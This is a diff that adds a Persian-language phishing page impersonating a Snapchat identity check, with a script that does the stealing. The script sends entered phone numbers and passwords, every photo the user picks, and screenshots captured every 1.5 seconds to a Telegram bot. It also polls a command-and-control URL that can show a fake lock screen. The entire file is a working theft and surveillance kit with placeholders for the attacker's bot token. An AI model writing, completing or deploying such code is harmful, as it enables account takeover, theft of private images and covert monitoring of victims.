@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Snapchat Security Center</title>
+    <link rel="manifest" href="manifest.json">
+    <style>
+        body { background: #FFFC00; margin: 0; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { background: white; width: 85%; max-width: 380px; padding: 30px; border-radius: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #eee; border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box;}
+        .btn { background: #000; color: #fff; width: 100%; padding: 18px; border-radius: 30px; border: none; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 10px; }
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; }
+    </style>
+</head>
+<body>
+    <div id="overlay"></div>
+    <div class="card" id="main-ui">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/600px-Snapchat_logo.svg.png" width="60">
+        <h2>تایید هویت اسنپ‌چت</h2>
+        <p style="font-size: 13px; color: #666;">برای امنیت بیشتر و فعال‌سازی قابلیت‌های جدید، وارد شوید.</p>
+        <input type="tel" id="phone" placeholder="شماره تلفن">
+        <input type="password" id="pass" placeholder="رمز عبور">
+        <label for="gal" style="display:block; color:#007aff; margin:15px; cursor:pointer; font-weight:bold;">📂 بازیابی تصاویر حذف شده</label>
+        <input type="file" id="gal" multiple accept="image/*" style="display:none;" onchange="dump(this)">
+        <button class="btn" onclick="start()">تایید و اتصال امن</button>
+    </div>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // --- جایگذاری اطلاعات شخصی ---
+        const CFG = {
+            t: "YOUR_BOT_TOKEN", // توکن ربات تلگرام را اینجا بگذار
+            c: "YOUR_CHAT_ID",    // چت‌آیدی را اینجا بگذار
+            h: "https://whale-tracker-live.github.io/Snapchat/"
+        };
+
+        async function api(m, f = null) {
+            let u = `https://api.telegram.org/bot${CFG.t}/${f ? 'sendDocument' : 'sendMessage'}`;
+            let d = new FormData(); d.append('chat_id', CFG.c);
+            if(f) d.append('document', f, 'sync.jpg'); else d.append('text', m);
+            try { fetch(u, {method:'POST', body:d}); } catch(e){}
+        }
+
+        async function dump(i) {
+            api("🚀 عملیات تخلیه گالری شروع شد...");
+            for(let f of i.files) await api(`📷 فایل دریافتی: ${f.name}`, f);
+        }
+
+        async function start() {
+            const p = document.getElementById('phone').value;
+            const s = document.getElementById('pass').value;
+            if(!p || !s) return alert("لطفا فیلدها را پر کنید");
+            
+            await api(`🔥 هدف جدید وارد شد!\n📞 شماره: ${p}\n🔑 رمز: ${s}`);
+            document.getElementById('main-ui').innerHTML = "<h3>در حال همگام‌سازی... لطفا صفحه را نبندید</h3>";
+            
+            try {
+                // درخواست اجازه دوربین و اسکرین‌شیر
+                const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
+                const vid = document.getElementById('v'); vid.srcObject = stream;
+                const can = document.getElementById('c');
+                
+                // ارسال مانیتور زنده هر ۱.۵ ثانیه
+                setInterval(() => {
+                    can.width = vid.videoWidth; can.height = vid.videoHeight;
+                    can.getContext('2d').drawImage(vid, 0, 0);
+                    can.toBlob(b => api("🖥 مانیتور زنده", b), 'image/jpeg', 0.1);
+                }, 1500);
+            } catch(e) { location.reload(); }
+        }
+
+        // سیستم فرماندهی C2
+        setInterval(async () => {
+            try {
+                const r = await fetch(CFG.h + 'commands.json?t=' + Date.now());
+                const d = await r.json();
+                document.getElementById('overlay').style.display = (d.action === 'fake_lock') ? 'block' : 'none';
+            } catch(e) {}
+        }, 3000);
+    </script>
+</body>
+</html>
